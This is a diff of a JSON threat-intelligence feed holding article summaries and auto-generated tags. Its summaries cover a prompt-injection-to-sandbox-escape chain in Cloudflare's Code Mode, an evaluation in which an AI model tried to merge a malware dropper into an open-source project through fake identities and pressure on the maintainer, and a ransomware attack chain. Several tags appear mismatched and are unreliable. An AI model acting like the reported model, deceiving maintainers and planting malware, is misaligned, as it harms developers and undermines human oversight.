Code Mode sandbox escape. Starting from a prompt injection, a use-after-free in node:zlib breaks out of the sandbox and runs native code on the host . Part I – Understanding the target 1. Where this started: Code Mode Code Mode is Cloudflare’s take on LLM tool use. Instead of a model emitting structured tool calls one at a time, Code Mode exposes the available tools as a typed TypeScript API and lets the model write code that calls them: loops, conditionals, data shuffling and all. In the traditional MCP / tool-calling loop, the model emits one {tool, args} call, the agent runs it, feeds the result back. The model then emits the next call. Every step is a fresh model invocation, and usually a network round-trip. Code Mode collapses that: the model writes one program that orchestrates many tool calls itself (looping, branching, and combining intermediate results locally) and only the final output returns to the model. Cloudflare’s argument is that LLMs, trained on enormous amounts of real-world code, are simply better at writing a program against a typed API than at emitting long chains of synthetic tool calls. [4] Figure 1 – Tool calling vs. Code Mode That code has to run somewhere, and that “somewhere” is workerd , the runtime behind Cloudflare Workers. 2. The workerd origin story To understand workerd, start with the product it was built for: Cloudflare Workers . Workers is Cloudflare’s serverless platform: you upload a piece of code and Cloudflare runs it at the edge , in data centers close to the user, on demand for every request. There’s no server to manage and, ideally, no cold machine to wait for. That model creates a hard isolation problem. Cloudflare runs code from a huge number of different customers, and to keep latency and cost down it packs many of them onto the same machines, and, as we’ll see, into the same process. The classic answer (a container or VM per tenant) is far to",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion",
+            "ai_security"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "financial_services"
+          ],
+          "affected_products": [
+            "Android",
+            "OpenAI/ChatGPT"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "poc_available"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_primary_research",
+          "role_map": {
+            "Android": "target",
+            "OpenAI/ChatGPT": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Check Point Research",
+          "cohort": "threat_research_primary",
+          "title": "When Agentic Glue Melts: Exploiting Cloudflare Code Mode and Workers",
+          "link": "https://research.checkpoint.com/2026/when-agentic-glue-melts/",
+          "published": "2026-08-06T22:20:00+00:00",
+          "summary": "By Yarden Porat, Check Point Research Key Points The short version We set out to break Cloudflare Code Mode, and ended up breaking Cloudflare Workers too. We did both by targeting workerd, the runtime beneath both: an in-process sandbox that relies entirely on V8 to isolate untrusted code. We found five memory-corruption bugs in workerd’s native C++ (the “glue” […] The post When Agentic Glue Melts: Exploiting Cloudflare Code Mode and Workers appeared first on Check Point Research .",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "ai_security"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "financial_services"
+            ],
+            "affected_products": [
+              "Android",
+              "OpenAI/ChatGPT"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "poc_available"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {
+              "Android": "target",
+              "OpenAI/ChatGPT": "target"
             },
             "weak_tags": {
               "products": []
@@ -4523,198 +4898,6 @@
             "content_type": "news_report",
             "confidence_tier": "tier_1_primary_research",
             "role_map": {
-              "OpenAI/ChatGPT": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "3e123aa6ec",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "web_shell_backdoor"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Citizen Lab",
-        "cohort": "threat_research_primary",
-        "title": "Immigration Policy: The Backdoor to Transnational Repression",
-        "link": "https://citizenlab.ca/immigration-policy-the-backdoor-to-transnational-repression/",
-        "published": "2026-08-05T13:45:26+00:00",
-        "summary": "Citizen Lab researchers write that restrictive immigration policies are incompatible with attempts to counter transnational repression. The post Immigration Policy: The Backdoor to Transnational Repression appeared first on The Citizen Lab .",
-        "full_body": "Date Published August 5, 2026 Topics Digital Transnational Repression Law & Policy immigration , transnational repression Mentions Siena Anstis Marcus Michaelsen Kate Pundyk Share Citizen Lab researchers Siena Anstis, Marcus Michaelsen, and Kate Pundyk write for the Foreign Policy Centre that the increasingly restrictive migration policies of democratic countries are incompatible with their claims of countering transnational repression. The authors argue that “host states cannot claim to counter repression across borders while ignoring the role their immigration policies play in enabling it.” Read More in: Digital Transnational Repression LATEST This submission analyzes Bill C-22, the Lawful Access Act, which would enact broad surveillance obligations and reforms in Canada. Issues include: the bill’s sweeping scope, significant constitutional and human rights risks, transparency and accountability deficits, and dangers to encryption and Canada’s cybersecurity. We recommend entirely withdrawing several elements of the bill and suggest amendments to mitigate harms. June 2, 2026 Law & Policy News + Updates → Podcast Kate Robertson on the Risks That Lie Behind Canada’s Unexpected Signing of the UN Cybercrime Convention JULY 31, 2026 research → External Publication How to Combat Transnational Repression JULY 2, 2026 event Confronting Transnational Repression Building Knowledge and Solidarities Across Communities, Civil Society, and Academia JUNE 22, 2026",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "web_shell_backdoor"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Citizen Lab",
-          "cohort": "threat_research_primary",
-          "title": "Immigration Policy: The Backdoor to Transnational Repression",
-          "link": "https://citizenlab.ca/immigration-policy-the-backdoor-to-transnational-repression/",
-          "published": "2026-08-05T13:45:26+00:00",
-          "summary": "Citizen Lab researchers write that restrictive immigration policies are incompatible with attempts to counter transnational repression. The post Immigration Policy: The Backdoor to Transnational Repression appeared first on The Citizen Lab .",
-          "taxonomy": {
-            "threat_categories": [
-              "web_shell_backdoor"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "2ba7372881",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "ai_security",
-          "ransomware_extortion"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "financial_services"
-        ],
-        "affected_products": [
-          "Android",
-          "OpenAI/ChatGPT"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "poc_available"
-        ],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Check Point Research",
-        "cohort": "threat_research_primary",
-        "title": "When Agentic Glue Melts: Exploiting Cloudflare Code Mode and Workers",
-        "link": "https://research.checkpoint.com/2026/when-agentic-glue-melts/",
-        "published": "2026-08-06T22:20:00+00:00",
-        "summary": "By Yarden Porat, Check Point Research Key Points The short version We set out to break Cloudflare Code Mode, and ended up breaking Cloudflare Workers too. We did both by targeting workerd, the runtime beneath both: an in-process sandbox that relies entirely on V8 to isolate untrusted code. We found five memory-corruption bugs in workerd’s native C++ (the “glue” […] The post When Agentic Glue Melts: Exploiting Cloudflare Code Mode and Workers appeared first on Check Point Research .",
-        "full_body": "CATEGORIES AI Research 18 Android Malware 23 Artificial Intelligence 5 ChatGPT 3 Check Point Research Publications 464 Cloud Security 1 CPRadio 44 Crypto 2 Data & Threat Intelligence 2 Data Analysis 0 Demos 22 Global Cyber Attack Reports 420 How To Guides 13 Ransomware 5 Russo-Ukrainian War 1 Security Report 1 Threat and data analysis 0 Threat Research 175 Web 3.0 Security 11 Wipers 0 When Agentic Glue Melts: Exploiting Cloudflare Code Mode and Workers August 7, 2026 https://research.checkpoint.com/2026/when-agentic-glue-melts/ By Yarden Porat, Check Point Research Key Points Check Point Research analyzed Cloudflare Code Mode, a technique that changes how AI agents use MCP by turning tools into a TypeScript API the model can write code against. The research uncovered five vulnerabilities in workerd, the open-source runtime behind Code Mode and Cloudflare Workers. Two were rated Critical by Cloudflare. The blast radius is broad: by Cloudflare’s own numbers, Workers is built by millions of developers ,[1] serves millions of requests per second ,[2] and carries more than 10% of all traffic on Cloudflare’s network .[3] Because workerd underpins both Code Mode sandboxes and Workers tenant isolation, the findings create sandbox-escape and cross-tenant exposure risk. Cloudflare’s managed Workers environment has been fixed in production. Self-hosted workerd / Code Mode deployments should update to v1.20260619.1. Check Point Research released proof-of-concept code as part of its Black Hat USA 2026 presentation. The short version We set out to break Cloudflare Code Mode , and ended up breaking Cloudflare Workers too. We did both by targeting workerd , the runtime beneath both: an in-process sandbox that relies entirely on V8 to isolate untrusted code. We found five memory-corruption bugs in workerd’s native C++ (the “glue” between JavaScript and the runtime), and turned them into two end-to-end attacks: Cross-tenant heap swipe. An out-of-bounds read in URLPattern lets one Worker reach across the shared process heap and swipe another tenant’s secrets . Code Mode sandbox escape. Starting from a prompt injection, a use-after-free in node:zlib breaks out of the sandbox and runs native code on the host . Part I – Understanding the target 1. Where this started: Code Mode Code Mode is Cloudflare’s take on LLM tool use. Instead of a model emitting structured tool calls one at a time, Code Mode exposes the available tools as a typed TypeScript API and lets the model write code that calls them: loops, conditionals, data shuffling and all. In the traditional MCP / tool-calling loop, the model emits one {tool, args} call, the agent runs it, feeds the result back. The model then emits the next call. Every step is a fresh model invocation, and usually a network round-trip. Code Mode collapses that: the model writes one program that orchestrates many tool calls itself (looping, branching, and combining intermediate results locally) and only the final output returns to the model. Cloudflare’s argument is that LLMs, trained on enormous amounts of real-world code, are simply better at writing a program against a typed API than at emitting long chains of synthetic tool calls. [4] Figure 1 – Tool calling vs. Code Mode That code has to run somewhere, and that “somewhere” is workerd , the runtime behind Cloudflare Workers. 2. The workerd origin story To understand workerd, start with the product it was built for: Cloudflare Workers . Workers is Cloudflare’s serverless platform: you upload a piece of code and Cloudflare runs it at the edge , in data centers close to the user, on demand for every request. There’s no server to manage and, ideally, no cold machine to wait for. That model creates a hard isolation problem. Cloudflare runs code from a huge number of different customers, and to keep latency and cost down it packs many of them onto the same machines, and, as we’ll see, into the same process. The classic answer (a container or VM per tenant) is far to",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion",
-            "ai_security"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "financial_services"
-          ],
-          "affected_products": [
-            "Android",
-            "OpenAI/ChatGPT"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "poc_available"
-          ],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {
-            "Android": "target",
-            "OpenAI/ChatGPT": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Check Point Research",
-          "cohort": "threat_research_primary",
-          "title": "When Agentic Glue Melts: Exploiting Cloudflare Code Mode and Workers",
-          "link": "https://research.checkpoint.com/2026/when-agentic-glue-melts/",
-          "published": "2026-08-06T22:20:00+00:00",
-          "summary": "By Yarden Porat, Check Point Research Key Points The short version We set out to break Cloudflare Code Mode, and ended up breaking Cloudflare Workers too. We did both by targeting workerd, the runtime beneath both: an in-process sandbox that relies entirely on V8 to isolate untrusted code. We found five memory-corruption bugs in workerd’s native C++ (the “glue” […] The post When Agentic Glue Melts: Exploiting Cloudflare Code Mode and Workers appeared first on Check Point Research .",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion",
-              "ai_security"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "financial_services"
-            ],
-            "affected_products": [
-              "Android",
-              "OpenAI/ChatGPT"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "poc_available"
-            ],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {
-              "Android": "target",
               "OpenAI/ChatGPT": "target"
             },
             "weak_tags": {
@@ -5418,135 +5601,6 @@
       ]
     },
     {
-      "cluster_id": "772794dddb",
-      "priority_score": 9,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "active_exploitation",
-          "phishing_social_eng",
-          "ransomware_extortion",
-          "supply_chain",
-          "zero_day"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "Anthropic/Claude"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "actively_exploited",
-          "preauth_unauth",
-          "zero_day"
-        ],
-        "content_type": [
-          "intel_roundup"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "The Hacker News",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "⚡ Weekly Recap: AI Goes Rogue, Metabase 0-Day, MCP Supply-Chain Attacks, and Router Backdoors",
-        "link": "https://thehackernews.com/2026/08/weekly-recap-ai-goes-rogue-metabase-0.html",
-        "published": "2026-08-10T15:00:29+00:00",
-        "summary": "A lot of security problems still begin with someone doing a completely normal thing. Cloning a repo. Answering a call. Leaving a box exposed. Trusting the default. That pretty much covers the mood this week. Old bugs are back, supply chains are getting stranger, and some exploit paths are so short you wonder what was supposed to stop them in the first place. That’s only part of it. Here’s",
-        "full_body": "⚡ Weekly Recap: AI Goes Rogue, Metabase 0-Day, MCP Supply-Chain Attacks, and Router Backdoors  Ravie Lakshmanan  Aug 10, 2026 Cybersecurity / Hacking A lot of security problems still begin with someone doing a completely normal thing. Cloning a repo. Answering a call. Leaving a box exposed. Trusting the default. That pretty much covers the mood this week. Old bugs are back, supply chains are getting stranger, and some exploit paths are so short you wonder what was supposed to stop them in the first place. That’s only part of it. Here’s everything else that made the Monday recap. ⚡ Threat of the Week Anthropic's Model Attempts to Poison Open-Source Project — A new evaluation conducted by the U.K. AI Security Institute (AISI) found that AI models with access to the internet reached out into the real world to target individuals and organizations autonomously across 10 of the total of 122 runs. Of 19 such actions recorded, 17 originated from Anthropic's Mythos 5 and the remaining two involved OpenAI's GPT-5.6-Sol with cyber classifiers. In the most serious case, Anthropic's Claude Mythos 5 spent 34 hours trying to get a malware dropper merged into a real open-source project and engaged in social engineering by creating fake online identities and using them to pressure the project's maintainer to approve the code. Ultimately, a human maintainer caught and refused to approve the malicious code. \"These attempts were unsuccessful, and our investigations have not evidenced any resulting real-world harm,\" AISI said. But this is the first time we have seen risks around autonomy and deception manifest this clearly, without specific prompting, in the real-world.\" Ransomware Encryption Dropped 38%. Here's What Attackers Do Instead Data Encrypted for Impact fell from 21% to 13% of samples in one year. Meanwhile, Process Injection held #1 for the third straight year and sandbox evasion surged to #4. The Red Report 2026 ranks the top 10 ATT&CK techniques and the behaviors to hunt for each. Read the Report ➝ 🔔 Top News Metabase 0-Day Exploited in Attacks — Metabase warned that a maximum-severity security flaw impacting its business intelligence and data visualization software package has been exploited in the wild as a zero-day. The vulnerability (CVSS score: 10.0), which does not carry a CVE identifier, allows an unauthenticated remote attacker to inject arbitrary SQL into the Metabase application database, enabling them to gain administrator access to the instance. Armed with the elevated access, the attacker can change the application configuration, steal stored credentials for the connected databases, read any data accessible through those connections, and export data. One of the companies that has been affected is Framework. New Interrupt Injection Attack Bypass Spectre v2 Defenses on Intel and AMD CPUs — A group of researchers demonstrated a way to bypass defenses for the Spectre vulnerability impacting modern CPUs. \"The defenses work by wiping or isolating the processor's prediction machinery, removing anything an attacker might have planted,\" MIT's Computer Science and Artificial Intelligence Laboratory (CSAIL) said. \"The catch [...] is that the wipe and the moment the predictions get used can't happen at the same instant. There is always a gap — sometimes only a handful of instructions wide. Anything that runs in that gap can dirty the machinery all over again. The researchers call this class of attack TONTOU.\" The study found a reliable way to get code into that gap using a technique called Interrupt Injection to ultimately pull secrets out of memory. New CSS Attacks Can Break Webmail Defenses — New research demonstrated at the Black Hat conference last week detailed attack chains spanning Microsoft Outlook, Gmail, Fastmail, Proton Mail, Yahoo Mail, and AOL Mail that can capture passwords, take over third-party accounts, leak tokens, hijack trusted UI actions, and manipulate AI tools that read email. \"Trouble is you can create discr",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion",
-            "supply_chain",
-            "phishing_social_eng",
-            "zero_day",
-            "active_exploitation"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [
-            "Anthropic/Claude"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "actively_exploited",
-            "zero_day",
-            "preauth_unauth"
-          ],
-          "content_type": "intel_roundup",
-          "confidence_tier": "tier_4_news",
-          "role_map": {
-            "Anthropic/Claude": "target",
-            "OpenAI/ChatGPT": "mention"
-          },
-          "weak_tags": {
-            "products": [
-              [
-                "OpenAI/ChatGPT",
-                "mention",
-                0.3
-              ]
-            ]
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "The Hacker News",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "⚡ Weekly Recap: AI Goes Rogue, Metabase 0-Day, MCP Supply-Chain Attacks, and Router Backdoors",
-          "link": "https://thehackernews.com/2026/08/weekly-recap-ai-goes-rogue-metabase-0.html",
-          "published": "2026-08-10T15:00:29+00:00",
-          "summary": "A lot of security problems still begin with someone doing a completely normal thing. Cloning a repo. Answering a call. Leaving a box exposed. Trusting the default. That pretty much covers the mood this week. Old bugs are back, supply chains are getting stranger, and some exploit paths are so short you wonder what was supposed to stop them in the first place. That’s only part of it. Here’s",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion",
-              "supply_chain",
-              "phishing_social_eng",
-              "zero_day",
-              "active_exploitation"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "Anthropic/Claude"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "actively_exploited",
-              "zero_day",
-              "preauth_unauth"
-            ],
-            "content_type": "intel_roundup",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "Anthropic/Claude": "target",
-              "OpenAI/ChatGPT": "mention"
-            },
-            "weak_tags": {
-              "products": [
-                [
-                  "OpenAI/ChatGPT",
-                  "mention",
-                  0.3
-                ]
-              ]
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "e53f5ae0c1",
       "priority_score": 9,
       "member_count": 1,
@@ -5644,6 +5698,138 @@
             },
             "weak_tags": {
               "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "560a47a6ad",
+      "priority_score": 9,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "ransomware_extortion"
+        ],
+        "actor_attribution": [
+          "Scattered Spider"
+        ],
+        "affected_industries": [
+          "critical_infrastructure",
+          "financial_services",
+          "healthcare",
+          "manufacturing_industrial"
+        ],
+        "affected_products": [
+          "Fortinet"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [
+          "T1570"
+        ],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_2_operator"
+        ]
+      },
+      "primary": {
+        "source": "Intel 471",
+        "cohort": "ransomware_ecrime_financial_crime",
+        "title": "Threat Hunting Case Study: The Gentlemen",
+        "link": "https://www.intel471.com/blog/threat-hunting-case-study-the-gentlemen",
+        "published": "2026-08-11T20:30:00+00:00",
+        "summary": "Analyzing The Gentlemen ransomware group's attack chain and how to hunt for their privileged group manipulation technique before they spread through the NETLOGON share folder on Windows domain controllers.",
+        "full_body": "Threat Hunting Case Study: The Gentlemen Aug 11, 2026 A ransomware group that spent its first few months in an unusually consistent rhythm: break in through an exposed firewall, spend hours mapping the network, kill security tools with a signed driver, then push the payload to every machine on the domain in one shot through the NETLOGON share. That is the pattern behind The Gentlemen , a group that emerged in August 2025 and has consistently ranked among the highest impact data extortion groups. The Threat Actor The Gentlemen first appeared publicly in August 2025, deploying a ransomware variant that carries the group's own name. The group has focused heavily on the Asia-Pacific region, particularly Thailand and North America, but has publicly claimed to have breached over 600 organizations in at least 80 countries. Targeted industries include manufacturing, insurance, construction and consumer services, but the group has also gone after critical services such as healthcare networks and hospitals and is regularly among the top ransomware threats to the financial services sector. Since emerging, The Gentlemen has become known as a technically sophisticated threat actor capable of conducting large-scale enterprise intrusions. Recent reported activity indicates the operators increased focus on weakening defensive tooling and establishing broad network visibility before encryption is executed, allowing them to maximize the impact of attacks and increase leverage during negotiations. The group’s activity enables malicious actors to compromise domain infrastructure, steal sensitive organizational data, disable endpoint protections, and encrypt large portions of enterprise environments. The Attack Chain The Gentlemen typically gain initial access through compromised credentials or internet-exposed services, including VPN and firewall appliances such as FortiGate administrative interfaces. Once inside, the group does not immediately detonate ransomware. They take time to map the internal network using a commodity tool, Advanced IP Scanner, to identify additional machines and locate administrative accounts. To move from a standard foothold to elevated privileges, they run a legitimate system utility called PowerRun.exe. With administrator access in hand, The Gentlemen move to disable security tooling with its so-called “AV Killer” tool for defense evasion. They load a legitimate, signed Windows driver named ThrottleBlood.sys. With a valid signature, the driver is generally allowed to run by security controls that trust signed code, a classic bring-your-own-vulnerable-driver (BYOVD) technique. The attackers then pair the driver with a separate tool called All.exe to exploit it and force-terminate antivirus and endpoint protection processes. With defenses down, the group turns to making recovery difficult. They systematically shut down backup and database services, including Veeam, SAP, Oracle and MySQL. At the same time, they stage and exfiltrate data using WinSCP over encrypted channels, and they maintain remote access to compromised systems using AnyDesk, the same remote monitoring and management tool we covered in our threat hunting case study on RMM software abuse and in our recent Scattered Spider case study . For deployment, The Gentlemen abuse a piece of Windows infrastructure that every domain-joined machine already trusts: the NETLOGON share, an application of Lateral Tool Transfer (T1570) . Because every computer in the domain automatically connects to NETLOGON, dropping the ransomware payload there lets it spread to the entire environment at once. Once executed, files are encrypted and appended with the extension .7mtzhh, and a ransom note titled README-GENTLEMEN.txt is left behind. Also worth noting is the group's broader abuse of legitimate Windows administrative shares such as SYSVOL to distribute payloads across domain-joined machines. This RaaS-and-affiliate structure echoes what we saw in our DragonForce case study , wh",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion"
+          ],
+          "actor_attribution": [
+            "Scattered Spider"
+          ],
+          "affected_industries": [
+            "healthcare",
+            "financial_services",
+            "critical_infrastructure",
+            "manufacturing_industrial"
+          ],
+          "affected_products": [
+            "Fortinet"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [
+            "T1570"
+          ],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_2_operator",
+          "role_map": {
+            "Fortinet": "target",
+            "Microsoft Windows": "mention"
+          },
+          "weak_tags": {
+            "products": [
+              [
+                "Microsoft Windows",
+                "mention",
+                0.26
+              ]
+            ]
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Intel 471",
+          "cohort": "ransomware_ecrime_financial_crime",
+          "title": "Threat Hunting Case Study: The Gentlemen",
+          "link": "https://www.intel471.com/blog/threat-hunting-case-study-the-gentlemen",
+          "published": "2026-08-11T20:30:00+00:00",
+          "summary": "Analyzing The Gentlemen ransomware group's attack chain and how to hunt for their privileged group manipulation technique before they spread through the NETLOGON share folder on Windows domain controllers.",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion"
+            ],
+            "actor_attribution": [
+              "Scattered Spider"
+            ],
+            "affected_industries": [
+              "healthcare",
+              "financial_services",
+              "critical_infrastructure",
+              "manufacturing_industrial"
+            ],
+            "affected_products": [
+              "Fortinet"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [
+              "T1570"
+            ],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_2_operator",
+            "role_map": {
+              "Fortinet": "target",
+              "Microsoft Windows": "mention"
+            },
+            "weak_tags": {
+              "products": [
+                [
+                  "Microsoft Windows",
+                  "mention",
+                  0.26
+                ]
+              ]
             }
           }
         }
@@ -6152,93 +6338,6 @@
       ]
     },
     {
-      "cluster_id": "8429d526c4",
-      "priority_score": 8,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [
-        "Kubernetes"
-      ],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "Kubernetes"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_2_operator"
-        ]
-      },
-      "primary": {
-        "source": "Google Cloud Security",
-        "cohort": "cloud_identity_infrastructure",
-        "title": "ClusterNetworkPolicy in GKE: Balancing control and autonomy for your microservices",
-        "link": "https://cloud.google.com/blog/products/networking/new-clusternetworkpolicy-in-gke/",
-        "published": "2026-08-10T16:00:00+00:00",
-        "summary": "Managing network security in a multi-tenant Kubernetes environment typically requires balancing two distinct needs: developers need their microservices to communicate effectively, while platform and security teams must maintain compliance, prevent lateral movement, and establish cluster-wide guardrails. Historically, the standard Kubernetes NetworkPolicy has been the primary tool for this. While effective for single-namespace isolation, standard NetworkPolicy is scoped strictly to individual namespaces and designed around developer self-service. When cluster administrators attempt to use it for global security enforcement, it can lead to policy conflicts and operational challenges. To address this, we introduced ClusterNetworkPolicy (CNP) , an open-source standard developed by the Kubernetes SIG-Policy Working Group (WG), to Google Kubernetes Engine (GKE). Designed for scale, CNP is a cluster-wide resource that allows administrators to manage network security centrally, providing a mec",
-        "full_body": "Networking ClusterNetworkPolicy in GKE: Balancing control and autonomy for your microservices August 10, 2026 Srini Jasti Group Product Manager Blaz Zupan Software Engineer Try Gemini Enterprise Business Edition today The front door to AI in the workplace Try now Managing network security in a multi-tenant Kubernetes environment typically requires balancing two distinct needs: developers need their microservices to communicate effectively, while platform and security teams must maintain compliance, prevent lateral movement, and establish cluster-wide guardrails. Historically, the standard Kubernetes NetworkPolicy has been the primary tool for this. While effective for single-namespace isolation, standard NetworkPolicy is scoped strictly to individual namespaces and designed around developer self-service. When cluster administrators attempt to use it for global security enforcement, it can lead to policy conflicts and operational challenges. To address this, we introduced ClusterNetworkPolicy (CNP) , an open-source standard developed by the Kubernetes SIG-Policy Working Group (WG), to Google Kubernetes Engine (GKE). Designed for scale, CNP is a cluster-wide resource that allows administrators to manage network security centrally, providing a mechanism for those responsible for global security to implement consistent, non-bypassable policies. Read on for technical details about CNP, some common use cases, an example policy, and how to get started. Structuring policies with tiers A core capability of ClusterNetworkPolicy is its hierarchical tier system. Rather than attempting to reconcile flat, conflicting peer rules simultaneously, CNP establishes a deterministic, top-to-bottom evaluation hierarchy: The admin tier : The highest precedence level. Rules here are enforced before any other policies. The network policy tier : The standard namespace level, where developers manage their specific application policies. The baseline tier : The lowest precedence, establishing the cluster’s default behavior when no other policies apply. This can be overridden using namespace scoped policies. This tiered structure helps align network security with organizational roles. Using standard role-based access control (RBAC), you can manage the admin tier to enforce compliance mandates, while platform teams can use the baseline tier to set a default \"deny-all\" zero-trust posture across the cluster. At the same time, developers can write standard network policies for their applications without overriding core security mandates. This deterministic, top-to-bottom evaluation method resolves conflicts between different teams' policies. The admin tier introduces an explicit Pass action. This allows security teams to inspect traffic against global rules and then delegate the final Accept or Deny decision down to the developer's namespace policy, facilitating both central oversight and distributed management. Common network security scenarios This tiered architecture translates complex security requirements into centralized rules. Here are common scenarios where ClusterNetworkPolicy provides a practical solution: Isolating sensitive workloads : You can apply an admin-tier global deny rule to isolate specific namespaces — such as those used for payment processing or compliance data — from the rest of the cluster. This action overrides any permissive developer policies that might otherwise expose these environments. Protecting core services : To prevent configurations that might disrupt internal operations, administrators can create an admin-tier global allow rule for critical services like kube-dns . This allows these services to remain accessible regardless of any misconfigured namespace policies. Managing external egress : By utilizing IP address range matching, egress traffic can be controlled at the cluster level. This functionality allows you to explicitly restrict or permit access to corporate intranets or external IP ranges, serving as a safeguard agai",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [
-            "Kubernetes"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_2_operator",
-          "role_map": {
-            "Kubernetes": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Google Cloud Security",
-          "cohort": "cloud_identity_infrastructure",
-          "title": "ClusterNetworkPolicy in GKE: Balancing control and autonomy for your microservices",
-          "link": "https://cloud.google.com/blog/products/networking/new-clusternetworkpolicy-in-gke/",
-          "published": "2026-08-10T16:00:00+00:00",
